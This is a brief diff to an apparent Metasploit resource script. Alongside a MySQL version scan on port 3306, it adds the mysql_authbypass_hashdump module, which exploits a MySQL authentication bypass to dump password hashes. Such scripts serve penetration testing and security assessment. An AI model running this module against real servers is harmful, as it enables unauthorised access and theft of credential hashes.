@@ -5,3 +5,6 @@ setg RPORT 3306
 use auxiliary/scanner/mysql/mysql_version
 run
 
+use scanner/mysql/mysql_authbypass_hashdump
+run
+
